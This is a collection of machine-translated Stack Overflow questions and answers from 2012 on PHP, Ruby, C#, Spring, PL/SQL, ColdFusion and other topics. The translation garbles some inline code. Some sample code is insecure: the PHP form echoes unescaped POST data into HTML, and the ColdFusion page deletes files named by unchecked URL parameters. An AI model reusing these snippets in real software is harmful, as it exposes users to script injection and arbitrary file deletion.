    <input type="text" name="first_name" placeholder="First Name" value="<?php echo $_POST[first_name]; ?>" required/>
    <input type="text" name="last_name" placeholder="Last Name" value="<?php echo $_POST[last_name]; ?>" required/><br>
    <label class="bill-address">Billing Address:<br>
        <input type="text" name="address1" placeholder="Address 1" value="<?php echo $_POST[address1]; ?>" required/><br>
        <input type="text" name="address2" placeholder="Address 2" value="<?php echo $_POST[address2]; ?>" /><br>
        <input type="text" name="city" placeholder="City" value="<?php echo $_POST[city]; ?>" required/>
    </label>
<?php  
$state_list = array('AL'=>"Alabama",  
                                        'AK'=>"Alaska",  
                                        'AZ'=>"Arizona",  
                                        'AR'=>"Arkansas",  
                                        'WV'=>"West Virginia",  
                                        'WI'=>"Wisconsin",  
                                        'WY'=>"Wyoming");
                            ?>
                            <select name="state">
                            <?php
                                while(list($k,$v) = each($state_list)) {
                                    $selected = '';
                                    if ($k == $_POST[state]) {
                                        $selected = ' selected="true"';
                                    }
                                echo "<option value=\"$k\"$selected>$v</option>\n";
                                } 
                            ?>
                            </select>
            <input type="text" name="zip" placeholder="Zip Code" value="<?php echo $_POST[zip]; ?>" required/>
            <br style="clear: left;" />
            <input type="email" name="email" placeholder="you@youremail.com" value="<?php echo $_POST[email]; ?>" required/>
            <input type="tel" name="phone" placeholder="Phone" value="<?php echo $_POST[phone]; ?>" required/>
    <h3>Choose your Package</h3>
        <select name="package">
            <option value="Free">Free!</option>
            <option value="Basic">Basic</option>
            <option value="Corporate">Corporate</option>
            <option value="Enterprise">Enterprise</option>
            <option value="Enterprise_20">Enterprise 20</option>
            <option value="Enterprise_50">Enterprise 50</option>
            <option value="Enterprise_100">Enterprise 100</option>
        </select>
    <h3>Add Media Package?</h3>
            <input type="radio" name="Yes" value="yes" />Yes
            <input type="radio" name="No" value="no" />No
    <button type="submit" class="btn">Send &raquo;</button>
    <?php echo $success_message; ?>
</form>
</body>
</html> 
```

和变量现在已保存，它们应显示在下面的页面标记中`$message`。`$success_message`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T17:56:58.637

```
 //validate email
     function is_valid_email($email) {

    $result = true;
    $pattern = '/^([a-z0-9])(([-a-z0-9._])*([a-z0-9]))*\@([a-z0-9])(([a-z0-9-])*([a-z0-9]))+(\.([a-z0-9])([-a-z0-9_-])?([a-z0-9])+)+$/i';
    if(!preg_match($pattern, $email)) {
        $result = false;
    }
    return $result;
}

   //when submit has been pressed, begin form validate
   if(isset($_POST['submit'])) {

  $valid = true;
  $message = '';
  if ( $_POST['first_name'] == "" ) {
    $message = "Please include your first name. ";
   echo $message;
    $valid = false; 
  }
if ( $_POST['last_name'] == "" ) {
    $message = "Please include your last name. ";
    echo $message;
    $valid = false; 
}
if ( $_POST['address1'] == "" ) {
    $message = "Please include your billing address. ";
    echo $message;
    $valid = false; 
  }
  if ( $_POST['city'] == "" ) {
    $message = "Please enter a city. ";
    echo $message;
    $valid = false; 
  }
  if ( $_POST['state'] == "" ) {
    $message = "Please select a state. ";
  echo $message;
    $valid = false; 
}
if ( $_POST['zip'] == "" ) {
    $message = "Please include a zip code. ";
   echo $message;
    $valid = false; 
}
if ( $_POST['phone'] == "" ) {
    $message = "Please include your phone number. ";<
    echo $message;
    $valid = false; 
}
if ( !is_valid_email($_POST['email']) ) {
    $message = "A valid email is required. ";
    echo $message; 
    $valid = false; 
}
if ( $_POST['package'] == "" ) {
    $message = "You forgot to select a service package. ";
    echo $message;
    $valid = false; 
}

if ( $valid == true ) {
    $success_message = 'Brilliant I say! We will be in contact with you shortly.';
    echo $success_message;

    //clear form when submission is successful
    unset($_POST);
} 
```

}

`echo $message`我在验证期间添加了回`.=`显，我认为是错误的方式，否则您将收到一条包含所有错误消息的消息..

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-10T21:40:45.227

尝试在该`unset( $_POST )`行之后添加：

```
header('Location: contact.php'); 
```

这应该带你回到`contact.php`页面。

编辑：

但是，为了让您的代码完全按照您想要的方式工作，我会这样做。

```
<?php 
    session_start();

    if (isset ($_SESSION['message'])) {
        echo $_SESSION['message'];
        session_destroy();
    }
?>    
<form action="process.php" method="post" name="sign_up">
<input type="text" name="first_name" placeholder="First Name" value="<?php echo $_POST[first_name]; ?>" />
<input type="text" name="last_name" placeholder="Last Name" value="<?php echo $_POST[last_name]; ?>" /><br>
<label class="bill-address">Billing Address:<br>
<input type="text" name="address1" placeholder="Address 1" value="<?php echo $_POST[address1]; ?>" /><br>
<input type="text" name="address2" placeholder="Address 2" value="<?php echo $_POST[address2]; ?>" /><br>
<input type="text" name="city" placeholder="City" value="<?php echo $_POST[city]; ?>" />
    </label>
<?php  
   $state_list = array('AL'=>"Alabama",  
    'AK'=>"Alaska",  
    'AZ'=>"Arizona",  
    'AR'=>"Arkansas",  
    'WV'=>"West Virginia",  
    'WI'=>"Wisconsin",  
    'WY'=>"Wyoming");
?>
     <select name="state">
 <?php
    while(list($k,$v) = each($state_list)) {
    $selected = '';
    if ($k == $_POST[state]) {
   $selected = ' selected="true"';
}
 echo "<option value=\"$k\"$selected>$v</option>\n";
} 
?>
</select>
<input type="text" name="zip" placeholder="Zip Code" value="<?php echo $_POST[zip]; ?>" />
<br style="clear: left;" />
<input type="email" name="email" placeholder="you@youremail.com" value="<?php echo $_POST[email]; ?>" />
<input type="tel" name="phone" placeholder="Phone" value="<?php echo $_POST[phone]; ?>" />
<h3>Choose your Package</h3>
<select name="package">
           <option value="Free">Free!</option>
            <option value="Basic">Basic</option>
            <option value="Corporate">Corporate</option>
            <option value="Enterprise">Enterprise</option>
            <option value="Enterprise_20">Enterprise 20</option>
            <option value="Enterprise_50">Enterprise 50</option>
            <option value="Enterprise_100">Enterprise 100</option>
</select>
    <h3>Add Media Package?</h3>
            <input type="radio" name="Yes" value="yes" />Yes
            <input type="radio" name="No" value="no" />No
    <button type="submit" class="btn">Send &raquo;</button>
<?php 
    //session already started on line 2

    if (isset( $_SESSION['success'] )) {
        echo $_SESSION['success'];
        session_destroy();
    }
?>

</form> 
```

那是为了`contact.php`和

```
<?php

//when submit has been pressed, begin form validate else return to contact.php
  if ( $_SERVER[ 'REQUEST_METHOD' ] == "POST" ) {
    session_start();

    //validate email
function is_valid_email($email) {

        $result = true;
        $pattern = '/^([a-z0-9])(([-a-z0-9._])*([a-z0-9]))*\@([a-z0-9])(([a-z0-9-])*([a-z0-9]))+(\.([a-z0-9])([-a-z0-9_-])?([a-z0-9])+)+$/i';
        if(!preg_match($pattern, $email)) {
            $result = false;
        }
        return $result;
    }

    $valid = true;
    $message = '';
    if ( $_POST['first_name'] == "" ) {
        $message .= "Please include your first name. ";
        $valid = false; 
    }
    if ( $_POST['last_name'] == "" ) {
        $message .= "Please include your last name. ";
        $valid = false; 
    }
    if ( $_POST['address1'] == "" ) {
        $message .= "Please include your billing address. ";
        $valid = false; 
    }
    if ( $_POST['city'] == "" ) {
        $message .= "Please enter a city. ";
        $valid = false; 
    }
    if ( $_POST['state'] == "" ) {
        $message .= "Please select a state. ";
        $valid = false; 
    }
    if ( $_POST['zip'] == "" ) {
        $message .= "Please include a zip code. ";
        $valid = false; 
    }
    if ( $_POST['phone'] == "" ) {
        $message .= "Please include your phone number. ";
        $valid = false; 
    }
    if ( !is_valid_email($_POST['email']) ) {
        $message .= "A valid email is required. "; 
        $valid = false; 
    }
    if ( $_POST['package'] == "" ) {
        $message .= "You forgot to select a service package. ";
        $valid = false; 
    }

    if ( $valid == true ) {
        $success_message = 'Brilliant I say! We will be in contact with you shortly.';

        //clear form when submission is successful
        unset($_POST);
        $_SESSION['success']=$success_message;
    }
    else {
        $_SESSION['message'] = $message;
    }
    header('Location: contact.php');
} // end of if ( $_SERVER[ 'REQUEST_METHOD' ] == "POST" )
else header('Location: contact.php');

?> 
```

`process.php`

我认为以下控件在您的代码中造成了最大的混乱：

```
//when submit has been pressed, begin form validate
if(isset($_POST['submit'])) 
```

一旦我更换它，一切都开始变得更好。

# ruby - 在 File 对象上重新打开流

> ID：13313301
> 
> 赞同：4
> 
> 时间：2012-11-09T17:48:11.350
> 
> 标签：ruby, io

假设你关闭了一个红宝石`File`对象

```
f = File.open('testfile')
f.close
f.each_byte { ... } #=> IOError: closed stream 
```

我知道您可以通过 重新打开流`f = File.open(f)`，但是有没有办法通过`IO`对象上的方法重新打开流？

例如

```
f.close
f.open_again
f.each_byte { ... } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T20:55:05.477

`IO#close`文档说：

> 关闭 → 无
> 
> 关闭 ios 并将所有挂起的写入刷新到操作系统。该流不可用于任何进一步的数据操作；如果进行此类尝试，则会引发 IOError。

这意味着您不能再次重新打开**同一个**流，因为到那时它也可能已经关闭了底层文件描述符。

给你`reopen`的是，你可以让这个**对象**指向另一个流/文件。如果您的 IO 对象绑定到一个常量，则可能很有用，但您需要关闭文件并重新打开另一个文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:09:23.460

`File`超类`IO`优惠[`IO#rewind`](http://www.ruby-doc.org/core-1.9.3/IO.html#method-i-rewind)。这适用于文件等持久资源，但不适用于管道、tty 和套接字等真正的流。

# objective-c - 我想画一条线并用Objective C中的重复图像填充它

> ID：13313304
> 
> 赞同：1
> 
> 时间：2012-11-09T17:48:26.403
> 
> 标签：objective-c

我不需要代码，只是一个起点。我在 iPad 上有一个绘图应用程序，您可以在其中画一条从 a 点到 b 点的线。在 2 点之间，线被替换为重复图像。！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T20:08:46.517

一种可能的方法是使用 CGColor *Pattern*，然后使用它画线。您可以使用`CGColorCreateWithPattern`创建颜色模式。

# ember.js - Ember.js 的模板加载延迟

> ID：13313305
> 
> 赞同：4
> 
> 时间：2012-11-09T17:48:27.217
> 
> 标签：ember.js, delay, handlebars.js, pageload

我正在开发一个使用 Ember.js 和 Handlebars.js 的应用程序。我注意到页面首次加载时显示模板可能会有一点延迟。这是有道理的，因为 javascript 必须创建 HTML。当页面第一次加载它看起来像一个空白页面已经加载，然后突然一切都出现了。

老实说，这是一个我可以忍受的问题，但对我来说仍然有点尴尬。我可能只是过度分析了一些事情，但有没有其他人注意到这一点，是否有人建议如何使页面加载看起来更“自然”？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-10T21:37:17.077

正如我在上面评论的那样，您可以在页面呈现、加载数据等时显示微调器。例如，下面是一个 Mixin，它在视图呈现之前显示微调器：

```
App.ShowSpinnerWhileRendering = Ember.Mixin.create({
  layout: Ember.Handlebars.compile('<div class="loading">{{ yield }}</div>'),

  classNameBindings: ['isLoaded'],

  didInsertElement: function() {
    this.set('isLoaded', true);
    this._super();
  }
}); 
```

在您想等待数据加载的情况下（假设您使用路由器显示视图）：

```
App.ShowSpinnerWhileRendering = Ember.Mixin.create({
  layout: Ember.Handlebars.compile('<div class="loading">{{ yield }}</div>'),

  classNameBindings: ['isLoaded'],

  isLoaded: function() {
    return this.get('isInserted') && this.get('controller.isLoaded');
  }.property('isInserted', 'controller.isLoaded'),

  didInsertElement: function() {
    this.set('inserted', true);
    this._super();
  }
}); 
```

并将其混合到您的视图中：

```
App.ApplicationView = Ember.View.extend(App.ShowSpinnerWhileRendering, {
 // ...
}); 
```

然后定义一些 CSS 规则以在具有`showSpinner`类的元素上显示加载微调器（或其他东西），并在它也有`isLoaded`类时隐藏它：

```
.loading{
  background-image: url("spinner.png") 
  background-color: #DFDFDF
}

.is-loaded .loading {
  /* back to default styling, e.g. */
  background-image: none
  background-color: white
} 
```

# .net - 即使所有新发布者都有签名证书，未知发布者警告是否也会出现？

> ID：13313313
> 
> 赞同：2
> 
> 时间：2012-11-09T17:49:00.070
> 
> 标签：.net, vb.net, visual-studio-2010, deployment, code-signing

我刚刚创建了我想与世界分享的第一个软件，在其他几台计算机上检查它后，我记得会弹出未知发布者警告，该警告针对没有对其软件进行数字签名的软件弹出。

因此，在阅读之后，我发现获得身份验证签名证书将删除此警告，尽管在阅读更多内容后有人指出，即使您拥有来自信誉良好的供应商的签名证书，如果发布者是，用户仍然会收到相同的警告新的并且以前没有发布过软件。

我只是想验证这是真的。我正在使用高级安装程序进行部署。（但不认为这很重要）

这适用于在 Visual Studio 中创建的 .net 软件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T23:08:24.663

不，那不是真的。Unknown Publisher 仅显示未签名文件或已由非受信任来源颁发的证书签名的文件（例如您自己生成的证书）。

[我在http://codesigning.ksoftware.net](http://codesigning.ksoftware.net)上有一些截图示例，说明您将在已签名文件和未签名文件之间看到的提示差异

给我发一封电子邮件，如果您决定购买一张，我会给您（和其他任何人）一张额外的折扣券。

# c# - XML Writer 将结果存储到字符串

> ID：13313314
> 
> 赞同：3
> 
> 时间：2012-11-09T17:49:04.513
> 
> 标签：c#, xml, linq, c#-4.0, linq-to-xml

> **可能重复：**
> [将数据表转换为自定义 XML 的替代方法](https://stackoverflow.com/questions/13297843/alternative-ways-to-convert-data-table-to-customized-xml)

```
DataTable dt = new DataTable();
dt.Columns.Add(new DataColumn("Product_ID", Type.GetType("System.String")));
dt.Columns.Add(new DataColumn("Product_Name", Type.GetType("System.String")));
dt.Columns.Add(new DataColumn("product_Price", Type.GetType("System.Int32")));
fillRows("hello1", dt, "product1", 1111);
fillRows("hello2", dt, "product2", 2222);
fillRows("hello3", dt, "product3", 3333);
fillRows("hello4", dt, "product4", 4444);

var xmlColumnZero = dt.AsEnumerable().Select(col => col[0].ToString()).ToArray() ; // row 0 turnovermultiplieer
var xmlRowZero = dt.Columns;
string firstColumnHeader = dt.Columns[0].ToString();
// XmlDocument xmldoc = new XmlDocument();
XmlWriter writer = XmlWriter.Create("employees.xml");
writer.WriteStartDocument();
writer.WriteStartElement("Employees");

// XmlElement first = xmldoc.CreateElement("Order");
//xmldoc.AppendChild(first);
foreach (DataColumn dc  in dt.Columns ) 
{

    if (dc.ToString() == firstColumnHeader) continue;
    string firstcol = dc.ToString();
    writer.WriteStartElement(firstcol);
    // XmlElement colRoot = xmldoc.CreateElement(firstcol);
    //first.AppendChild(colRoot);
    for (int i = 0 ; i <dt.Rows.Count && i< xmlColumnZero.Length ; i++)
    {
        string firstrow = xmlColumnZero[i];
        string dtagaga = dt.Rows[i][dc].ToString();
        writer.WriteElementString(firstrow, dtagaga);
       // XmlElement rowRoot = xmldoc.CreateElement(firstrow, dtagaga);
        //colRoot.AppendChild(rowRoot);

    }
    writer.WriteEndElement();
}
writer.WriteEndElement();
writer.WriteEndDocument(); 
```

我希望在创建 XMLWriter 时将 XMl 存储到字符串中。

有没有另一种方法可以从表中创建 xml

XML 应该看起来像

xml writer 方法将所有内容存储到程序位置的 xml 文件中。希望保存一个字符串

```
<Employees>
<Product_Name>
<hello1>product1</hello1>
hello2>product2</hello2>
hello3>product3</hello3>
hello4>product4</hello4>
</product_name>
<product_Price>
<hello1>1111</hello1>
hello2>2222</hello2>
hello3>3333</hello3>
hello4>4444</hello4>
</product_Price>
</Employees> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T17:55:14.077

只需使用重载方法[`XmlWriter.Create(StringBuilder output)`](http://msdn.microsoft.com/en-us/library/66dybzaw.aspx)来创建 xml 字符串。在这种情况下，所有输出都将被写入`StringBuilder`而不是文件：

```
StringBuilder builder = new StringBuilder();
XmlWriter writer = XmlWriter.Create(builder);
//... build xml here

string xml = builder.ToString(); 
```

您也可以将 xml 写入`MemoryStream`with [`XmlWriter.Create(Stream output)`](http://msdn.microsoft.com/en-us/library/x972ksd0.aspx)。

```
Stream stream = new MemoryStream();
XmlWriter writer = XmlWriter.Create(stream);
// ... build xml here

stream.Position = 0;
string xml = new StreamReader(stream).ReadToEnd(); 
```

**更新**

下面的扩展方法将生成您的 xml 字符串。默认情况下，它使用第一列作为元素名称，但您可以为包含元数据的列传递任何列索引。我也使用表名来生成“员工”标签，所以在创建数据表时提供名称`DataTable dt = new DataTable("Employees");`。

```
public static string ToXml(this DataTable table, int metaIndex = 0)
{
    XDocument xdoc = new XDocument(
        new XElement(table.TableName,
            from column in table.Columns.Cast<DataColumn>()
            where column != table.Columns[metaIndex]
            select new XElement(column.ColumnName,
                from row in table.AsEnumerable()
                select new XElement(row.Field<string>(metaIndex), row[column])
                )
            )
        );

    return xdoc.ToString();
} 
```

用法很简单：

```
string xml = dt.ToXml(); 
```

输出：

```
<Employees>
  <Product_Name>
    <hello1>product1</hello1>
    <hello2>product2</hello2>
    <hello3>product3</hello3>
    <hello4>product4</hello4>
  </Product_Name>
  <product_Price>
    <hello1>111</hello1>
    <hello2>222</hello2>
    <hello3>333</hello3>
    <hello4>444</hello4>
  </product_Price>
</Employees> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T17:55:15.660

使用 a[`StringBuilder`](http://msdn.microsoft.com/en-us/library/system.text.stringbuilder.aspx)并[使用 the而不是文件](http://msdn.microsoft.com/en-us/library/66dybzaw.aspx)[创建`XmlWriter``StringBuilder`](http://msdn.microsoft.com/en-us/library/66dybzaw.aspx)：

```
StringBuilder sb = new StringBuilder();
XmlWriter writer = XmlWriter.Create(sb);
writer.WriteStartDocument();
//...
writer.WriteEndDocument();
var myXmlString = sb.ToString(); //myXmlString will contain the XML 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T17:57:23.030

而不是创建文件

```
XmlWriter writer = XmlWriter.Create("employees.xml"); 
```

您可以使用字符串流

```
StringWriter sw = new StringWriter();
XmlWriter writer = XmlWriter.Create(sw);
...
...
// sw.ToString(); // string output 
```

# java - 有一个带注释的抽象控制器类是否有意义 - Spring MVC

> ID：13313315
> 
> 赞同：12
> 
> 时间：2012-11-09T17:49:09.787
> 
> 标签：java, spring, spring-mvc, controller, abstract-class

**在 Spring MVC 驱动的容器中拥有一个带注释的（@Controller）抽象类**是否有意义，基本上希望将大多数可重用方法（例如**异常处理程序**）放在抽象类中，并用基类扩展它，所以不要'不必重复相同的样板代码。例如。

**抽象控制器类：**

```
 @Controller
    abstract class AbstractExternalController {

    @ExceptionHandler(NoSuchRequestHandlingMethodException.class)
    @ResponseStatus(value = HttpStatus.NOT_FOUND)
    public @ResponseBody ResponseModel handleNotFoundException() {
            final ResponseModel response = new ErrorModel();
            response.setStatus("404");
                response.setMessage("Resource Not Found");
                return response;
             } 
...

    } 
```

**基本控制器类**

```
@Controller
class ExternalControllerXXX extends AbstractExternalController  {

...
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-09T18:30:52.187

没有必要用注解来注释你的`AbstractExternalController`类`@Controller`，但是，把它留在那里不会破坏任何东西。不管你有没有`@Controller`注解，你当然可以有方法注解，它们都可以工作。您`ExternalControllerXXX`对它的扩展将被添加到应用程序上下文中（因为它使用 streotype 注释进行了注释），并且`@ExceptionHandler`and`@ResponseStatus`注释将被尊重。

# oracle - 在包规范中声明或定义游标时，有没有办法避免定义记录类型？

> ID：13313319
> 
> 赞同：2
> 
> 时间：2012-11-09T17:49:26.650
> 
> 标签：oracle, plsql, cursor, record, rowtype

我的雇主使用一个应用程序，该应用程序将有关业务案例的元数据存储在一个主表和大约 40 个详细表中。

目前，我维护一个包，它从这些表中读取并为每个主记录生成一个带有 HTML 输出的文件。

我的包裹正文包含以下内容：

```
type output_text_type is table of varchar(32768);
function fA(mri in master_record_identifier_type)
        return output_text_type
is
cursor cA(if1 master_record_identifier_type.if1%type, ...)
is
select tA.f1, tA.f2, ...
from tA
where tA.if1 = if1
...;
begin -- fA
        ...
        for r in cA(mri.if1, mri.if2, ...) loop
           <generate HTML using r.f1, r.rf2, mri.if1...>
        end loop;
end fA;
... some 40 more function with the same structure ... 
```

顺便说一句，大多数游标返回少于 100 条记录（通常为零或一条），因此`fetch ... bulk collect ...`不会导致性能提升。

现在我们计划与其他组织交换业务案例的元数据（当然还有文档本身）。为此，我们必须生成具有 - 实质上 - 相同内容的 xml 数据结构。

为了满足这个要求，我计划将我当前的包（受模型-视图-控制器模式的影响）拆分为一个包 pkg_cursors、一个 pkg_html 和一个（尚未编写的）pkg_xml。

唉，我通过定义如下记录找到了一个可行的解决方案：

```
create or replace package pkg_cursors
as
type rA is record(
       if1 tA.if1%type,
       f1  tA.f1%type, 
       f2  tA.f2%type,
       ... a dozen more fields ...
       );
cursor ca(master_record_identifier_type.if1%type, ...)
     return rA;
... 
```

这是不幸的，因为到目前为止，向表中添加列会导致更新游标的 select 子句并将新列添加到游标循环中。从现在开始，我要考虑第三个地方：记录定义。

我还尝试了包规范中的游标：

```
create package pkg_cursors
as
cursor cA(...) is
select <select-list>
from ... where ...
return cA%rowtype; 
```

但我得到了编译错误。

因此，我的问题是：有没有办法避免游标返回参数的记录定义？

你认为有更好的方法来拆分包裹吗？

（请原谅我的语言错误和这个问题的长度。我对英语的掌握会更扎实吗，这个问题可能会更短。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:40:15.937

动态 SQL 示例是否对您的问题有帮助？当然不必流水线，我就是这样做的。

```
SQL> create table one (id number, foo varchar2(20), if1 number);

Table created.

SQL> create table two (id number, foo varchar2(20), foo2 date, if1 number);

Table created.

SQL> insert into one values(1, 'test', 1);

1 row created.

SQL> insert into one values(1, 'test again', 1);

1 row created.

SQL> insert into two values(1, '2nd table', sysdate-1, 1);

1 row created.

SQL> insert into two values(1, '2nd table - 2', sysdate-10, 1);

1 row created.

SQL> insert into two values(1, '2nd table - 3', sysdate-3, 1);

1 row created.

SQL> create type vc_tab as table of varchar2(4000);
  2  /

Type created.

SQL> create or replace function gen_html(p_tab in varchar2, p_master_id in number)
  2  return vc_tab
  3  pipelined
  4  is
  5    v_cur           integer default dbms_sql.open_cursor;
  6    v_col_val       varchar2(4000);
  7    v_col_val_clob  clob;
  8    v_status        integer;
  9    v_desc_tbl      dbms_sql.desc_tab;
 10    v_col_cnt       number;
 11    v_row           varchar2(4000);
 12  begin
 13    execute immediate 'alter session set nls_date_format=''dd-mon-yyyy hh24:mi:ss'' ';
 14    execute immediate 'alter session set nls_timestamp_tz_format=''dd-mon-yyyy hh24:mi:ssxff tzh:tzm''';
 15    execute immediate 'alter session set nls_timestamp_format=''dd-mon-yyyy hh24:mi:ssxff''';
 16
 17    dbms_sql.parse(v_cur,  'select * from ' || dbms_assert.simple_sql_name(p_tab) || ' where if1 = :b1',
 18                   dbms_sql.native);
 19    dbms_sql.bind_variable(v_cur, 'b1', p_master_id);
 20    dbms_sql.describe_columns(v_cur, v_col_cnt, v_desc_tbl);
 21
 22    for i in 1 .. v_col_cnt
 23    loop
 24      if (v_desc_tbl(i).col_type = 109)
 25      then
 26        dbms_sql.define_column(v_cur, i, v_col_val_clob);
 27      else
 28        dbms_sql.define_column(v_cur, i, v_col_val, 4000);
 29      end if;
 30    end loop;
 31
 32    v_status := dbms_sql.execute(v_cur);
 33
 34    pipe row('<h1>' || p_tab || '</h1>');
 35    pipe row('<table>');
 36    while ( dbms_sql.fetch_rows(v_cur) > 0 )
 37    loop
 38      pipe row('<tr>');
 39      for i in 1 .. v_col_cnt
 40      loop
 41        if (v_desc_tbl(i).col_type = 109)
 42        then
 43          dbms_sql.column_value(v_cur, i, v_col_val_clob);
 44          pipe row('<td>' || v_desc_tbl(i).col_name || '</td><td>' || v_col_val_clob || '</td>');
 45        else
 46          dbms_sql.column_value(v_cur, i, v_col_val);
 47          pipe row('<td>' || v_desc_tbl(i).col_name || '</td><td>' || v_col_val || '</td>');
 48        end if;
 49      end loop;
 50      pipe row('</tr>');
 51    end loop;
 52    pipe row('</table>');
 53    dbms_sql.close_cursor(v_cur);
 54
 55  end;
 56  /

Function created.

SQL> select * from table(gen_html('ONE', 1));

COLUMN_VALUE
--------------------------------------------------------------------------------
<h1>ONE</h1>
<table>
<tr>
<td>ID</td><td>1</td>
<td>FOO</td><td>test</td>
<td>IF1</td><td>1</td>
</tr>
<tr>
<td>ID</td><td>1</td>
<td>FOO</td><td>test again</td>
<td>IF1</td><td>1</td>
</tr>
</table>

13 rows selected.

SQL> select * from table(gen_html('TWO', 1));

COLUMN_VALUE
--------------------------------------------------------------------------------
<h1>TWO</h1>
<table>
<tr>
<td>ID</td><td>1</td>
<td>FOO</td><td>2nd table</td>
<td>FOO2</td><td>08-nov-2012 18:37:36</td>
<td>IF1</td><td>1</td>
</tr>
<tr>
<td>ID</td><td>1</td>
<td>FOO</td><td>2nd table - 2</td>
<td>FOO2</td><td>30-oct-2012 18:37:36</td>
<td>IF1</td><td>1</td>
</tr>
<tr>
<td>ID</td><td>1</td>
<td>FOO</td><td>2nd table - 3</td>
<td>FOO2</td><td>06-nov-2012 18:37:36</td>
<td>IF1</td><td>1</td>
</tr>
</table>

21 rows selected. 
```

# php - 使用 Boost::Process 运行 php 命令

> ID：13313334
> 
> 赞同：4
> 
> 时间：2012-11-09T17:50:32.877
> 
> 标签：php, boost, process, stdout, permission-denied

我尝试运行 PHP 脚本并从 stdout 获取输出，代码如下所示：

```
using namespace boost::process;

std::string exec="php";
std::vector<std::string> args;

// I must to throw the exe by argument
args.push_back("php");
args.push_back("a.php");

context ctx;
ctx.stdout_behavior = capture_stream();
child c = launch(exec, args, ctx);

pistream &is = c.get_stdout(); 
```

stdout 没有信息，但在 stderr 我得到：

“boost::process::detail::posix_start: execve(2) failed: Permission denied”

当我在终端中运行完全相同的命令时，它工作正常！

有什么解决办法吗？

谢谢..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T19:18:48.713

谢谢@hakre，你给了我正确的方向！

我去 /usr/bin/ 检查权限，看到 php5 命令与 php 具有相同的权限（php 是 php5 的链接）。

我不明白为什么，但是当我将命令替换为 php5 时，以前的错误替换为：“没有这样的文件或目录”，当我给出完整路径时，它工作正常：

```
exec="/usr/bin/php5";
args.clear();
args.push_back("php5"); 
```

# c++ - 字符类的 C++ 继承

> ID：13313336
> 
> 赞同：4
> 
> 时间：2012-11-09T17:50:41.423
> 
> 标签：c++, inheritance

我有一个重新创建游戏的任务。我必须实现一个字符列表。例如，我有一个`Character`只有角色名称的类。

现在，我需要创建一个`Warrior`在游戏中是敌人的角色。我是否需要像这样实现我的继承：`Character --> Enemy --> Warrior`当我的敌人类基本上没有属性时。这更像是一种分类。

有没有办法在同一个类中定义一个`Enemy`和一个，类型在哪里，类型在哪里？会有更多的敌人，但只有一个。`Warrior``Warrior``Enemy``Character``Warrior`

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T17:56:04.693

你说敌人类基本没有属性。

现在就是这种情况，但是使用 Enemy 类和继承的一个原因是，它现在通过构建（几乎）透明的灵​​活性更好地预测代码的未知未来需求。

您当然可以为 Enemy 类创建一个类型，但是当您添加更多敌人时，您可能会发现此解决方案需要越来越多的`switch`语句和`if`子句形式的代码来检查类型。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T17:56:45.543

如果所有战士都是敌人，并且具有敌人的所有属性，那么是的，将战士作为敌人的子类是有意义的。

正如一些评论指出的那样，拥有一个复杂的继承链是有问题的，并且没有不良程序架构的症状。

> 有没有办法在同一个类中定义一个 Enemy 和一个 Warrior，其中 Warrior 是 Enemy 类型，而 Enemy 是 Character 类型？

在我们讨论过的继承链中，Warrior 是 Type of Enemy，也是 Type of Character。

我认为您可能会将类与定义它的文件混淆。您不能定义具有两种类型的类。您可以在单个 .h 中定义多个类并在单个 cpp 文件中实现它们，但从风格上讲，最好在单个 .h/.cpp 对中定义单个类。

# javascript - 调用文件删除页面后返回页面状态

> ID：13313337
> 
> 赞同：1
> 
> 时间：2012-11-09T17:50:43.030
> 
> 标签：javascript, forms, coldfusion, fw1

我的表单允许用户选择一个目录来查看其中包含的文件：

（文件.cfm）

```
<form action="#buildURL('main.files')#" method="post">

        <!--- Show the subfolder path, unless already at top level --->
        <cfif subfolderPath EQ "">
            <h2>You are at the top level.</h2>
        <cfelse>
            <h2>Current Folder: #subfolderPath#</h2>
        </cfif>

        <!--- Provide a drop-down list of subfolder names --->
        Select folder:
        <select name="subfolderPath" onChange="this.form.submit()">
            <!--- Provide an option to go up one level to the parent folder, --->
            <!--- unless already at the BaseFolder --->
            <cfif listLen(subfolderPath, "/") gt 0>
                <cfset parentFolder = listDeleteAt(subfolderPath, listLen(subfolderPath, "/"), "/")>
                <option value="#parentFolder#">[parent folder]</option>
            </cfif>

            <!--- For each record in the query returned by <cfdirectory> --->
            <cfloop query="DirectoryQuery">
                <!--- If the record represents a subfolder, list it as an option --->
                <cfif Type eq "Dir">
                    <option value="#subfolderPath#/#Name#">#Name#</option>
                </cfif>
            </cfloop> 
        </select>

        <!--- Submit button to navigate to the selected folder --->
        <input type="submit" value="go">
    </form> 
```

显示文件时，有一个删除功能会调用另一个页面：

```
<td align="absmiddle"><a href="#buildUrl('main.deleteFile?filename=#name#&folder=#rereplace(subFolderPath, '/','')#')#" onClick="alert('Are you sure you want to delete this file?')"><img src="/art/assets/images/delete.png" title="delete file" /></a></td> 
```

在 deleteFile 页面 (deleteFile.cfm) 上，文件被删除：

```
<cfset local.filePath = ExpandPath( ".\upload\views\files\#rereplace(url.folder, '/','')#\" ) />
    <cffile action="delete"
            file="#local.filePath##url.filename#"
    /> 
```

然后用户被送回上一页：

```
<cflocation url="#buildUrl('main.files')#" /> 
```

但不在刚刚删除文件的目录的同一视图中。如何将用户返回到文件页面并维护他所在目录的视图？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:01:15.547

我能想到几种方法

首先，您可以使用 AJAX 调用删除操作文件。成功完成后，从当前页面中删除该元素。这是一种奇特的方式，但可能很难实现，因为看起来您可能对此有些陌生。

